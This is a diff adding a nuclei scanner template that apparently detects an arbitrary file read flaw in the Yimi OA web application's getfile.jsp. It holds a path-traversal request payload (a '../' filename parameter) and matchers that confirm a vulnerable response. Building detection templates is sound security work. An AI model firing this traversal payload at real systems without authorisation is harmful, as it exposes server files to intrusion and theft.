@@ -1,0 +1,26 @@
+# Add your nuclei formatted PoC!
+id: yimi-oa-LFI
+
+info:
+  name: yimi-oa-LFI
+  author: yoyo
+  severity: high
+  description: 一米OA getfile.jsp文件过滤不足，导致任意文件读取漏洞
+  tags: 一米OA,oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "filename"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
